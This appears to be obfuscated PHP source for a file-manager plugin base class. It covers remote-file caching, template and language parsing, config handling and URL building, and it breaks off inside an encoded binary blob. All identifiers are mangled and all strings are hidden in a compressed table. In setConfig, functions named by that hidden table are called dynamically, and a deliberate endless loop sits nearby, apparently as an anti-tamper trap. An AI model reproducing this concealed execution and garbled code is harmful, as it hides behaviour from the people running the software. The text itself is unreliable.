$this->_cacheHttpFile($Òœğ·©®, $ê«²´Şü); $this->fileInfo = IO::info($Òœğ·©®); } else { $this->fileInfo = IO::info($Òœğ·©®); $this->cachePath = $this->pluginCachePath($ŠÄ…Ù¾š[12], $ê«²´Şü); } return $Òœğ·©®; } final function _cacheHttpFile($ËÁµÇ, $»µà»Â = true) { $Ó­ ÑëÅ =& $_SERVER[†ûãı«°]; $Ÿ†ˆİ‚¿ = parse_url_query($ËÁµÇ); $—ÒÄ™‡Ô = get_path_ext($ËÁµÇ); if (isset($Ÿ†ˆİ‚¿[$Ó­ ÑëÅ[32]]) && $Ÿ†ˆİ‚¿[$Ó­ ÑëÅ[32]]) { $—ÒÄ™‡Ô = get_path_ext($Ÿ†ˆİ‚¿[$Ó­ ÑëÅ[32]]); } $­†ô±š = hash_path($ËÁµÇ) . $Ó­ ÑëÅ[10] . $—ÒÄ™‡Ô; $this->cachePath = $this->pluginCachePath($»µà»Â ? $­†ô±š : $Ó­ ÑëÅ[12]); $“¦ë¼³ø = IO::fileNameExist($this->cachePath, $­†ô±š); if ($“¦ë¼³ø) { return KodIO::make($“¦ë¼³ø); } $‡ãëùø = rtrim($this->cachePath, $Ó­ ÑëÅ[8]) . $Ó­ ÑëÅ[8] . $­†ô±š; return $this->pluginCacheFileSet($‡ãëùø, file_get_contents_nossl($ËÁµÇ)); } final function checkSharePath($Òˆ‹œÊµ, $ÕŸê“óç = true) { $·‰î¯æÉ =& $_SERVER[†ûãı«°]; if (!$this->isShare($Òˆ‹œÊµ)) { return !1; } $„‡Î´‘ = Action($·‰î¯æÉ[1267])->sharePathInfo($Òˆ‹œÊµ); if (!is_array($„‡Î´‘) || !isset($„‡Î´‘[$·‰î¯æÉ[87]])) { show_json(LNG($·‰î¯æÉ[1665]), !1); } $this->fileInfo = $„‡Î´‘; $this->cachePath = $this->pluginCachePath(!1, $ÕŸê“óç); return $„‡Î´‘[$·‰î¯æÉ[87]]; } final function pluginCachePath($ñäôşÜ… = '', $úÓõ¦˜¢ = false) { $óëåòß— =& $_SERVER[†ûãı«°]; if ($úÓõ¦˜¢ && is_array($this->fileInfo)) { $ñäôşÜ… = kodIO::hashPath($this->fileInfo); } $â£Î¬–È = rtrim(IO_PATH_SYSTEM_TEMP . $óëåòß—[1666] . $this->pluginName . $óëåòß—[8] . $ñäôşÜ…, $óëåòß—[8]); $ô×²ßÊ” = IO::infoFullSimple($â£Î¬–È); $¿ÚÌ¼‰Ã = $ô×²ßÊ” && is_array($ô×²ßÊ”) ? $ô×²ßÊ”[$óëåòß—[87]] : $óëåòß—[12]; if (!$¿ÚÌ¼‰Ã) { $¿ÚÌ¼‰Ã = IO::mkdir($â£Î¬–È); } return $¿ÚÌ¼‰Ã; } final function pluginCacheFileSet($óüëÇ˜š, $ÇµÉ™ = '') { $•‘Œàåæ =& $_SERVER[†ûãı«°]; $“ Ë—ô = IO::infoFullSimple($óüëÇ˜š); if (!$“ Ë—ô) { return IO::mkfile($óüëÇ˜š, $ÇµÉ™, REPEAT_REPLACE); } IO::setContent($“ Ë—ô[$•‘Œàåæ[87]], $ÇµÉ™); return $“ Ë—ô[$•‘Œàåæ[87]]; } final function pluginLocalFile($ô†îÁ•¢ = '') { $øÁéíîä =& $_SERVER[†ûãı«°]; $ˆµ©ÆÈ¯ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ˆµ©ÆÈ¯)) { mk_dir($ˆµ©ÆÈ¯); } if (!$ô†îÁ•¢) { return $ˆµ©ÆÈ¯; } $ŞÌ­Ò¶ã = IO::info($ô†îÁ•¢); $Ïöõ¶‡Ä = $øÁéíîä[1667] . KodIO::hashPath($ŞÌ­Ò¶ã) . $øÁéíîä[10] . $ŞÌ­Ò¶ã[$øÁéíîä[169]]; if (!checkExtSafe($Ïöõ¶‡Ä)) { $Ïöõ¶‡Ä = $Ïöõ¶‡Ä . $øÁéíîä[1302]; } $ô¿™¾§ğ = $ˆµ©ÆÈ¯ . $Ïöõ¶‡Ä; if (@file_exists($ô¿™¾§ğ)) { return $ô¿™¾§ğ; } return IO::copy($ô†îÁ•¢, $ˆµ©ÆÈ¯, 0, $Ïöõ¶‡Ä); } final function appPackage() { $šúÌš©§ =& $_SERVER[†ûãı«°]; if ($this->packageData) { return $this->packageData; } $˜Áï©ñü = $this->parseFile($this->pluginPath . $šúÌš©§[1668]); $this->parseLang($˜Áï©ñü); $’ÄŒòüÉ = json_decode_force($˜Áï©ñü); if (!$’ÄŒòüÉ) { return array(); } $ÑÀúğ–Ñ = Hook::trigger($šúÌš©§[1669], $’ÄŒòüÉ); if ($ÑÀúğ–Ñ && is_array($ÑÀúğ–Ñ)) { $’ÄŒòüÉ = $ÑÀúğ–Ñ; } $this->packageData = $’ÄŒòüÉ; return $’ÄŒòüÉ; } public function packageInfoGet($‡ßè—şİ) { $é’ì½Âë = $this->appPackage(); return array_get_value($é’ì½Âë, $‡ßè—şİ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[†ûãı«°][1670]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[†ûãı«°][1671]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[†ûãı«°][1672]); } public function echoJsAssign($¢ ä˜ç, $«’À·œÅ) { $this->echoJsAssignArr[$¢ ä˜ç] = $«’À·œÅ; } private function parseFile($ı‘ğş…Ì) { $‡Ç«ç§– =& $_SERVER[†ûãı«°]; $³¬îæêÜ = file_get_contents_nossl($ı‘ğş…Ì); $›–¹ÁŸµ = array($‡Ç«ç§–[1673], $‡Ç«ç§–[1674], $‡Ç«ç§–[1675], $‡Ç«ç§–[1676], $‡Ç«ç§–[1677], $‡Ç«ç§–[1678], $‡Ç«ç§–[1679]); $÷‘ëáóš = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‡Ç«ç§–[92]][$‡Ç«ç§–[1680]]); foreach ($this->echoJsAssignArr as $Æìß‚« => $›¿èõ Á) { $›–¹ÁŸµ[] = $‡Ç«ç§–[1681] . $Æìß‚« . $‡Ç«ç§–[1682]; $÷‘ëáóš[] = is_array($›¿èõ Á) || is_object($›¿èõ Á) ? rawurlencode(json_encode($›¿èõ Á)) : $›¿èõ Á; } if (strstr($³¬îæêÜ, $‡Ç«ç§–[1683])) { $ó§€åü = rawurlencode(json_encode($this->pluginLangArr)); $³¬îæêÜ = str_replace($‡Ç«ç§–[1683], $ó§€åü, $³¬îæêÜ); } if (strstr($³¬îæêÜ, $‡Ç«ç§–[1684])) { $ó§€åü = $ó§€åü = rawurlencode(json_encode($this->getConfig())); $³¬îæêÜ = str_replace($‡Ç«ç§–[1684], $ó§€åü, $³¬îæêÜ); } $³¬îæêÜ = str_replace($›–¹ÁŸµ, $÷‘ëáóš, $³¬îæêÜ); return $³¬îæêÜ; } private function parseLang(&$âø°ĞÈ‰) { $¦ïâ–ÓË =& $_SERVER[†ûãı«°]; $ªÛ»›÷ = $¦ïâ–ÓË[1685]; if (!strstr($âø°ĞÈ‰, $ªÛ»›÷)) { return; } preg_match_all($¦ïâ–ÓË[1686], $âø°ĞÈ‰, $…ù»õåÄ); if (!is_array($…ù»õåÄ) || count($…ù»õåÄ) == 0 || !is_array($…ù»õåÄ[0]) || count($…ù»õåÄ[0]) == 0) { return; } $¹•èñ³‚ = array(); $³ÚÙ¥÷® = array(); foreach ($…ù»õåÄ[0] as $Ê·‹Üúˆ) { $’Á›¸ = substr($Ê·‹Üúˆ, strlen($ªÛ»›÷), -4); $¼È³İøı = LNG($’Á›¸); $¹•èñ³‚[] = $Ê·‹Üúˆ; $³ÚÙ¥÷®[] = str_replace(array($¦ïâ–ÓË[287], $¦ïâ–ÓË[1167], $¦ïâ–ÓË[419], $¦ïâ–ÓË[121]), array($¦ïâ–ÓË[53], $¦ïâ–ÓË[53], $¦ïâ–ÓË[12], $¦ïâ–ÓË[1687]), $¼È³İøı); } $âø°ĞÈ‰ = str_replace($¹•èñ³‚, $³ÚÙ¥÷®, $âø°ĞÈ‰); } private function parseConfig(&$®Ïîö“Ÿ) { $¯îßÁÌÌ =& $_SERVER[†ûãı«°]; $Æ’êÙï” = $¯îßÁÌÌ[1688]; if (!strstr($®Ïîö“Ÿ, $Æ’êÙï”)) { return; } preg_match_all($¯îßÁÌÌ[1689], $®Ïîö“Ÿ, $„—ªì¯); if (!is_array($„—ªì¯) || count($„—ªì¯) == 0 || !is_array($„—ªì¯[0]) || count($„—ªì¯[0]) == 0) { return; } $ÍÔÇ¦°  = $this->getConfig(); $—èß˜£  = array(); $ˆÉÚÉ¶ = array(); foreach ($„—ªì¯[0] as $è¼õıÔç) { $®üÄ˜¥Ç = substr($è¼õıÔç, strlen($Æ’êÙï”), -2); $—èß˜£ [] = $è¼õıÔç; $ˆÉÚÉ¶[] = _get($ÍÔÇ¦° , $®üÄ˜¥Ç); } $®Ïîö“Ÿ = str_replace($—èß˜£ , $ˆÉÚÉ¶, $®Ïîö“Ÿ); } private function parsePackage(&$£†ëÎ) { $ñ½òÜ¢Î =& $_SERVER[†ûãı«°]; $Ó„»ë€“ = $ñ½òÜ¢Î[1690]; if (!strstr($£†ëÎ, $Ó„»ë€“)) { return; } preg_match_all($ñ½òÜ¢Î[1691], $£†ëÎ, $Æ„êÛïî); if (!is_array($Æ„êÛïî) || count($Æ„êÛïî) == 0 || !is_array($Æ„êÛïî[0]) || count($Æ„êÛïî[0]) == 0) { return; } $§¼Ï¸Ï÷ = $this->appPackage(); $ãÙ”Ÿ…í = array(); $ÀÎ’ı÷ = array(); foreach ($Æ„êÛïî[0] as $²Ë¥ÉÂĞ) { $·ô¤££ş = substr($²Ë¥ÉÂĞ, strlen($Ó„»ë€“), -2); $ãÙ”Ÿ…í[] = $²Ë¥ÉÂĞ; $ÀÎ’ı÷[] = _get($§¼Ï¸Ï÷, $·ô¤££ş); } $£†ëÎ = str_replace($ãÙ”Ÿ…í, $ÀÎ’ı÷, $£†ëÎ); } final function echoFile($¹Ä¢ç˜, $çÙ¬Ş“¥ = false) { $õ¼›¦Åô =& $_SERVER[†ûãı«°]; $÷ùê„¸ = $this->pluginPath . $¹Ä¢ç˜; if (ACT == $õ¼›¦Åô[1692]) { echo $õ¼›¦Åô[1693] . $this->pluginName . $õ¼›¦Åô[8] . $¹Ä¢ç˜ . $õ¼›¦Åô[1694]; if (!file_exists($÷ùê„¸)) { echo $õ¼›¦Åô[1695]; return; } } $Âº×Ù„Ğ = $this->parseFile($÷ùê„¸); $this->parseLang($Âº×Ù„Ğ); $this->parseConfig($Âº×Ù„Ğ); $this->parsePackage($Âº×Ù„Ğ); if (is_array($çÙ¬Ş“¥)) { $Âº×Ù„Ğ = str_replace(array_keys($çÙ¬Ş“¥), array_values($çÙ¬Ş“¥), $Âº×Ù„Ğ); } echo $õ¼›¦Åô[287] . $Âº×Ù„Ğ; } private function checkVersion() { $ÍÙ¹î =& $_SERVER[†ûãı«°]; $ïúÀÇĞÀ = $this->appPackage(); $»¡…¿ = $this->getConfig(); if ($»¡…¿[$ÍÙ¹î[1696]] == $ïúÀÇĞÀ[$ÍÙ¹î[1670]]) { return; } $this->regist(); $this->setConfig(array($ÍÙ¹î[1696] => $ïúÀÇĞÀ[$ÍÙ¹î[1670]])); } final function initLang() { $ÜÏ½¬İÅ =& $_SERVER[†ûãı«°]; $ƒÑæÑ = $ÜÏ½¬İÅ[1697]; $…¬¢¥Ç¢ = $this->pluginPath . $ÜÏ½¬İÅ[1698]; $’Ü‘é = I18n::getType(); $çÄ›Š¶ = array(); if (file_exists($…¬¢¥Ç¢ . $’Ü‘é . $ÜÏ½¬İÅ[920])) { $çÄ›Š¶ = (include $…¬¢¥Ç¢ . $’Ü‘é . $ÜÏ½¬İÅ[920]); } else { if ($’Ü‘é == $ÜÏ½¬İÅ[1699] && !file_exists($…¬¢¥Ç¢ . $’Ü‘é . $ÜÏ½¬İÅ[920]) && file_exists($…¬¢¥Ç¢ . $ÜÏ½¬İÅ[1700])) { $çÄ›Š¶ = (include $…¬¢¥Ç¢ . $ÜÏ½¬İÅ[1700]); } else { if (file_exists($…¬¢¥Ç¢ . $ƒÑæÑ . $ÜÏ½¬İÅ[920])) { $çÄ›Š¶ = (include $…¬¢¥Ç¢ . $ƒÑæÑ . $ÜÏ½¬İÅ[920]); } } } if (!is_array($çÄ›Š¶)) { return array(); } if (@count($çÄ›Š¶) > 0) { I18n::set($çÄ›Š¶); } return $çÄ›Š¶; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ã­ùáî±) { $Í»ÈŞÑ£ =& $_SERVER[†ûãı«°]; if (!isset($_SERVER[$Í»ÈŞÑ£[949]]) || !isset($_SERVER[$Í»ÈŞÑ£[950]])) { $İĞœ”Ğ· = $Í»ÈŞÑ£[967]; $˜·ëÁ„ = $Í»ÈŞÑ£[951]; $ßÍù’¢œ = $_SERVER[$Í»ÈŞÑ£[952]] . $Í»ÈŞÑ£[953]; $²ÄÌè°” = $˜·ëÁ„($ßÍù’¢œ); $ä×´¦Ÿ = explode($Í»ÈŞÑ£[287], $²ÄÌè°”); if (count($ä×´¦Ÿ) < $Í»ÈŞÑ£[690]) { $Òé£ú¤€ = $Í»ÈŞÑ£[954]; $Òé£ú¤€(); } $â¨Í²Æ« = $Í»ÈŞÑ£[968]; $â¨Í²Æ«($_SERVER[$Í»ÈŞÑ£[969]]); $ªÆˆ¦„‚ = 1; for ($µÃ˜…§› = $ªÆˆ¦„‚; $µÃ˜…§› > 0; $µÃ˜…§›++) { $â¨Í²Æ« = json_encode($GLOBALS[$Í»ÈŞÑ£[494]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ã­ùáî±); } public function onSetConfig($Ë›ø“ƒÌ) { } public function onGetConfig($°İ½ì£¶) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($í¡„Ì) { if ($í¡„Ì == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($‘˜‡ºË² = "\x70\154\x75\x67\x69\156\101\x75\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¶ö«èîâ = $this->getConfig(); if (!$¶ö«èîâ[$‘˜‡ºË²]) { return !1; } return ActionCall($_SERVER[†ûãı«°][1701], $¶ö«èîâ[$‘˜‡ºË²]); } public function url($ô¢„İ¹¬, $İßÛôÁ = '', $„ì¸¨¡ = true) { $Ğ¼°²Æ =& $_SERVER[†ûãı«°]; $ˆ‹Úáè¨ = $this->getConfig(); $®ÈÙØÀ = KOD_VERSION . $Ğ¼°²Æ[10] . KOD_VERSION_BUILD; $Öƒ¬œçÜ = $this->packageVersion(); $Û˜âøî‘ = $®ÈÙØÀ . $Ğ¼°²Æ[464] . $Öƒ¬œçÜ; if (substr($ô¢„İ¹¬, 0, 4) == $Ğ¼°²Æ[152] || substr($ô¢„İ¹¬, 0, 2) == $Ğ¼°²Æ[1422]) { $İ›Å¹”Œ = $ô¢„İ¹¬ . $Ğ¼°²Æ[1702] . $Û˜âøî‘; } else { if ($İßÛôÁ == $Ğ¼°²Æ[12]) { $İ›Å¹”Œ = $this->pluginHost . $ô¢„İ¹¬ . $Ğ¼°²Æ[1702] . $Û˜âøî‘; } else { if ($İßÛôÁ === $Ğ¼°²Æ[78]) { $İ›Å¹”Œ = $this->pluginHost . $ô¢„İ¹¬; } else { if ($İßÛôÁ == $Ğ¼°²Æ[1703]) { $İ›Å¹”Œ = STATIC_PATH . $ô¢„İ¹¬ . $Ğ¼°²Æ[1702] . $®ÈÙØÀ; } else { if ($İßÛôÁ == $Ğ¼°²Æ[1704]) { $İ›Å¹”Œ = APP_HOST . $Ğ¼°²Æ[1705] . $ô¢„İ¹¬ . $Ğ¼°²Æ[1702] . $®ÈÙØÀ; } else { if (isset($ˆ‹Úáè¨[$İßÛôÁ])) { $İ›Å¹”Œ = $ˆ‹Úáè¨[$İßÛôÁ] . $ô¢„İ¹¬ . $Ğ¼°²Æ[1702] . $Û˜âøî‘; } } } } } } if (!$„ì¸¨¡) { return $İ›Å¹”Œ; } echo $İ›Å¹”Œ; } public function link($ÄìÅ¶» = false, $²»†±ú = '') { $‰Øâôóî =& $_SERVER[†ûãı«°]; $‹ÚÔŠ—› = $this->linkHas == !1; $this->linkHas = !0; if (!$ÄìÅ¶») { $this->link($‰Øâôóî[1706], $‰Øâôóî[1704]); $this->link($‰Øâôóî[1707], $‰Øâôóî[1703]); $this->link($‰Øâôóî[1708], $‰Øâôóî[1703]); $this->link($‰Øâôóî[1709], $‰Øâôóî[1703]); $this->link($‰Øâôóî[1710], $‰Øâôóî[1703]); if ($‹ÚÔŠ—›) { Hook::trigger($‰Øâôóî[1711]); } return; } $ñæ‚ãüÑ = $this->url($ÄìÅ¶», $²»†±ú, !1); if (substr($ÄìÅ¶», -3) == $‰Øâôóî[1712]) { echo $‰Øâôóî[1713] . $ñæ‚ãüÑ . $‰Øâôóî[1714] . $‰Øâôóî[287]; } else { if (substr($ÄìÅ¶», -4) == $‰Øâôóî[1715]) { echo $‰Øâôóî[1716] . $ñæ‚ãüÑ . $‰Øâôóî[1717] . $‰Øâôóî[287]; } } if ($‹ÚÔŠ—›) { Hook::trigger($‰Øâôóî[1711]); } } } goto dø»ö¤ø®…; f‹ï±Ì‚¬â: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('hvvj/auw'), "\x9c\x9a\xa0\xb2\xc6\x9f"); $_SERVER[†ûãı«°] = explode("\174\1\174\5\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\265\160\241\120\10\5\112\137\241\320\5\230\230\44\266\23\55\266\263\73\161\202\154\313\266\210\154\31\111\316\202\155\46\143\151\144\115"."\54\151\144\315\310\113\26\266\2\1\2\11\64\354\204\245\100\51\155\111\2\245\204\45\204\255\205\76\240\100\241\245\320\225\55\166\302\126\112\312\132\50\374\167\71\167\231\221\14\357\377\336\377"."\x7d\x7f\x20\xd1\xdc\x7d\x3b\xf7\xdc\x73\xcf\x3d\xcb\x25\x9b\xfe\xf9\x9b\x9f\x5f\xb0\x76\xbf\xb5\x7\xae\xdd\xef\xe6\x33\x5f\xbe\xfe\x1f\x7f\xa3\xdf\x6b\xf7\x5f\x7b\x0\xfa\x4b\xbe\x8f\xdf\x70\xf0\x57\xc8\x9f\x6f"."\155\270\240\252\252\155\316\41\63\72\16\335\364\313\255\332\317\264\237\152\27\104\302\117\376\66\164\330\323\267\235\24\34\277\351\311\321\361\375\276\262\171\313\173\63\352\121\146\132\266\236\376\50"."\71\323\126\364\21\303\262\55\32\221\60\163\51\243\237\176\33\71\372\353\247\77\135\321\160\101\317\232\266\116\203\76\372\243\102\277\310\277\326\140\306\140\351\152\107\44\256\306\272\72\73\203\321"."\70\144\252\227\323\263\146\22\276\362\132\101\313\102\373\171\275\140\241\336\310\325\251\171\63\257\347\34\61\42\42\251\331\132\237\146\101\115\315\215\152\163\260\63\34\131\241\306\127\164\6\41\107".base64_decode('nzpY1AujNEQ+Y7ZWsONGVuc5hgu8X43B1lCHEo8GOmKBpngo0kGjmyLt7aF4aXw0Eg43Bpo=')."\x96\x94\xa6\x74\x46\x3\xad\xed\x1\x5\xf5\x2f\xa3\xab\x46\x2e\x65\x56\x29\x2b\x69\xca\x4a\xa5\x9a\x7e\xb4\x18\x7a\x26\x49\x3f\x73\x1a\xeb\x8e\x3d\x9a\x87\xaf\x38\xff\x42\xcb\x94\x2b\x66\x32\x34\xd0\xc1\xbf\x92"."\172\112\53\146\140\266\232\345\100\276\140\144\65\66\350\45\372\50\217\245\37\132\321\66\215\134\202\6\202\43\166\101\23\361\250\257\11\264\320\172\16\252\212\5\303\301\246\270\202\73\250\264\104"."\43\355\12\54\102\126\263\154\275\240\54\153\13\106\203\12\356\164\103\45\31\153\245\2\360\322\201\246\102\11\204\303\312\104\65\330\172\66\317\252\241\145\312\124\26\211\66\7\243\112\343\12\105"."\xcc\x50\xc2\xcc\x66\xcd\x9c\xf\xd5\x82\x56\xd2\x96\xba\x1a\x8c\x46\xe9\x87\x7\xc0\x3b\x1c\xc2\x8b\x6\x81\x48\x4b\x4b\x2c\xc8\x43\x30\xb8\x93\xc3\xa8\x27\x33\x1\x3e\x1d\xa1\x64\x2a\x63\xab\x43\x5a\xa6\xc8\xc0"."\x74\x80\xfe\x56\xc2\xf\xfc\x9a\x16\x80\xee\xa0\x91\x33\x8a\x0\xa6\x50\x85\x69\xf2\x6d\x5\x1f\x45\x96\x5b\x67\x31\x7a\x12\x3e\xb2\xa8\xbc\x9\xe5\xfa\x20\xae\x8f\xe5\x5a\xc5\x3e\xc\xb4\x43\x87\xe8\x67\xc3\x22"."\xfa\xbb\x0\xca\xf7\xa9\x38\x4d\x2f\xd8\xaa\x9e\x4b\x98\x49\x23\x7\xfb\x78\x31\xc0\xa3\x66\xa7\x9b\xb\x6\xca\x40\xc3\x29\x33\x93\x64\xdf\x96\xb1\x1a\x46\x99\x32\x32\x7a\x47\x31\x2b\x67\xe1\xc1\x44\xda\xc8\x24"."\xb\x6c\xeb\x7d\x51\x4e\x1a\xc\xf3\x9d\x8c\xf3\x8a\x50\x1e\xf5\x84\x23\x1\x23\x35\x2a\xb6\x22\xce\xd7\xc9\x53\x2d\xb3\x58\x48\xe8\x21\xb4\x75\x68\xb8\x16\xa2\x75\xdb\x46\x83\x63\x13\x62\x76\xe5\x33\xa6\x96\x8c".base64_decode('6QU+NMNsQRVFirYcWSTZWsxCthkhDTmuHW0bQ0QOsO2SlGbLX9V9pvez3u4T0T/VgBF7oD8=')."\x69\x3d\x93\x51\xf5\x11\x1d\xf6\x53\x36\x39\xdb\x62\x13\xe1\xb7\xfa\x8c\x9c\x1f\xc5\xd0\x60\x28\xa2\xa6\x35\x2b\xdd\x9e\x9c\xad\x92\x52\xc\xd1\x26\xf5\x11\x5f\x3e\x9d\x87\xcd\xce\xf7\x77\x8f\x3\xde\xf1\xb4\x75"."\x98\x76\x50\x42\xd7\x19\x33\xa1\x65\xe4\xa1\xd0\xef\xb4\x6d\xe7\x63\x7a\x2e\x89\x67\x1\x86\x62\xe\xe7\xc8\x2c\xe5\x75\x1d\x32\x35\x7b\x94\xa4\xd2\xae\xac\x50\xda\xea\x8d\x7a\x8b\x15\xcc\x66\xf8\x17\x1b\x1d\x8f".strrev('ÌÁvs2må–èH1¨5Ğ]–½·[	›ó™†Ù¡#óå«]‰ñXh4E§eH™2–Â=¤x³')."\x78\x3\x99\x8c\x39\xec\x8d\x14\x8c\x7e\x23\x57\xaf\x4c\x7\x1c\x8c\x12\xd1\x5e\xf7\x62\xbc\x58\xf\x1b\xb8\x62\x81\x82\x81\x6\x37\x33\xbd\xa1\x68\xa7\xbc\xf3\xd8\xc6\xe4\xb9\xb\x5a\xce\x4a\xe9\x5\x6f\x10\x76".base64_decode('Rb2COsuRI8vWbFh50zJw9+oVzba1RBojFlF9wxfkN3IZI6eX5kWV6N7Ogtaf1eqVfLEPTQA=')."\x6c\x46\x88\x4b\xe0\x1c\x72\x66\x98\x80\x7a\x25\xab\x8d\x78\xb5\x7e\x56\x53\x70\x24\x6f\x14\x74\x8b\x8d\x5a\x69\x6d\x8f\x3\x44\xa5\xbc\xed\x78\x13\x19\x7a\xd2\x1b\x43\x98\x1b\x2a\x9b\x59\x33\x4b\x41\xb0\xa2\xb0".base64_decode('NBrbFo93qqEWdDR3BNX2QLypDWq3tX5WdRjhY14li1zuRZsJQ1MHGpyI7DSH9QJquHG0Xhk=')."\x30\x93\x7d\xe6\x88\x8f\x25\xe1\xcc\x31\x84\x55\x58\x66\xbc\xbe\x79\xdb\x1b\xd5\x72\xfd\x78\x18\x7d\xa3\xb6\x6e\xb9\xf1\x52\x23\x3a\xc8\x7d\x29\xba\x73\x7d\x7d\x7a\xca\x2c\xc0\x68\xac\xa1\x7e\xe7\xe4\x87\xf5\x5c".base64_decode('v51mdceC0aXBqBqLtMSXBaJB2EUIckZYb3DrGW9UT6JJTNisnJYXs7/cizcMbpyl4k3E0sI=')."\xa1\x56\x3c\x77\xcd\x5e\xb\x65\xf2\xca\xb9\x58\xdd\x61\x23\x6b\xe0\xe1\xd9\x3c\x85\x4c\x36\x22\xa\x5a\xa1\x43\x7e\x32\xe6\x86\x1e\x6b\x7a\x55\x4f\x72\x46\xb5\x17\xfd\x3b\xbd\xba\xbb\xa7\xd9\x37\xbd\x77\xb1\xdf"."\20\145\374\265\276\132\245\256\146\216\322\211\250\24\103\313\50\60\350\222\34\65\112\144\211\163\132\4\204\347\314\234\136\166\143\41\100\62\55\335\333\246\153\10\101\243\205\160\254\213\207\265\105"."\303\137\60\273\370\234\224\160\211\153\135\150\144\64\170\162\127\60\26\127\333\203\361\266\110\63\164\77\30\200\257\34\52\114\372\313\326\30\23\145\160\44\346\240\132\175\104\72\77\304\71\220\220"."\x27\x84\x94\xeb\x30\x87\x19\xe6\x77\x1\x50\x53\x5a\x4f\xc\x4c\x90\x86\xbe\x60\x34\x26\xc5\x4b\x6c\xe9\xba\xe9\x4f\x2f\x40\x73\x2f\xfd\x51\xd\xab\x45\x3a\x33\x71\x90\xe3\x57\xd5\xec\x5b\x85\x20\xab\x5d\x67\x87"."\10\264\24\312\242\75\54\172\256\72\17\70\66\254\166\1\351\150\313\54\63\222\374\4\104\301\66\335\350\117\103\107\15\134\135\302\314\230\5\55\203\161\77\43\132\373\15\100\303\371\114\21\301"."\xbd\x1f\x57\x1c\x4f\x17\xb3\x7d\x70\x52\xa1\x39\xea\xd7\x6d\x41\x4f\x5a\xa3\x88\xe8\xca\xb2\xd3\x18\x1d\xe9\x76\xa8\xd9\x71\xe6\x42\xc8\xaf\x62\x58\xed\xf1\xe5\x73\xfd\xd5\x53\xa0\x2e\xb5\x6e\x76\xd\x8e\x80\x65"."\204\221\41\302\232\21\112\362\320\175\11\23\155\354\166\155\100\257\307\143\1\154\266\200\304\262\200\204\60\27\340\63\256\301\215\27\360\362\144\174\131\124\11\251\263\311\344\247\62\275\272\54\160".base64_decode('nnGKXiiYhcmQg3wr5KDEywWV25zksBAKYN9pk5MoJgPGej+Me2pdC6CNJCLVfJaNFgENUEs=').base64_decode('JstFI1QDFaxlcEoSGB3gj81E/4tDP2lmNXaEYszDm8UBi4fIuagn6cHoiKI7mkZNZ00WbBM=')."\47\26\34\71\21\220\246\115\350\64\202\12\30\160\221\217\234\315\101\122\317\350\14\300\322\72\243\55\152\40\33\132\31\16\176\51\276\17\320\315\1\305\12\202\316\260\242\250\44\246\4\130\170".strrev('4jn#¤SjÃ…t¶›iÄVÅ%C`V»v#ÃÆSĞYÜ"PÙÕZÏ‰\\L‰j¾')."\146\131\64\24\17\62\24\25\150\126\3\115\235\20\22\110\217\123\154\62\315\101\143\206\352\0\204\120\47\374\202\70\102\247\163\336\314\41\324\12\330\311\53\356\161\45\111\111\101\73\0\354\10"."\x7a\xc3\x45\x42\x20\x22\x20\xbb\xda\x9b\x45\x78\xc5\xcb\xfb\xd4\xd9\x5\x87\x3f\x83\xa\x46\x3\x37\x8e\x62\xf2\x96\xa1\x8e\xfe\xdc\x52\xbe\xf2\xcb\x62\xb3\xbc\x6d\xed\x81\x26\x6f\xac\x2d\x50\x37\x7b\xe\x8d\x5d"."\221\115\366\304\333\14\253\347\24\36\206\356\14\133\263\324\202\216\366\64\203\205\272\232\132\266\343\20\41\242\211\236\257\360\146\275\270\26\114\103\372\152\152\152\130\135\63\346\50\151\204\112\70".base64_decode('wk6S0bJrTTExoMv42/IOGwznTeH095TSybeK5DhTtQSuTkWF7aIlzxQCwCQqYjCymMZqmX4=')."\x13\xc1\x5d\x3a\x2b\x47\x26\x39\xfc\xd2\xb0\x4e\x69\x2c\x68\x28\xad\xf1\x79\xc2\xb3\xc7\x36\x7\xa2\xe0\x46\xe5\x42\x78\x9a\x51\x1f\x18\xfe\x76\x12\xd5\x4a\xbc\xfc\x44\x53\x5a\x3d\x4\xb3\x2d\xfa\x91\xc7\x47\x19"."\xc2\xda\x6c\xd9\xa6\xd1\x9f\x43\xa0\x1b\x45\xb4\x6f\xb\xc6\x6a\x69\xf6\x17\xb3\x9a\x18\xce\x8c\xc4\xa0\xc9\x91\x6c\x46\x5c\xb8\x60\x6a\x60\x36\xe5\xa1\x8d\xa8\x28\x45\x85\x14\x55\x4e\x69\xe3\x78\x80\xad\x42\x7b"."\263\153\117\320\323\236\306\55\134\214\132\124\206\60\373\306\314\65\124\326\372\152\52\25\166\15\155\250\354\212\267\40\302\174\361\242\103\26\66\231\331\74\106\53\344\316\205\307\113\41\167\21\214"."\x71\x21\x26\x7a\x58\xa0\xd3\x35\x1d\xc1\xb8\x6\xa7\xce\x42\xbf\x9c\x6f\xa1\x7f\xa2\x5a\x61\x28\x98\x12\x5b\xae\x76\x86\x3\xf1\x96\x48\xb4\x1d\x60\x3c\x9f\x17\x60\x95\x4f\x94\xdb\x6d\x5e\x81\x91\x8a\x96\x57\xc7".base64_decode('hDHsAi2RcYGoPBfLy0Li8nKQuNwFictLIXF5OTgbAoDUstpqM4f2Kzpos74EgEW8LdSxRG0=')."\217\64\7\303\152\250\3\21\160\361\322\370\256\316\346\0\103\203\162\174\143\44\336\346\210\355\102\44\334\322\100\70\344\316\36\134\36\212\305\143\145\223\120\134\127\320\225\322\334\25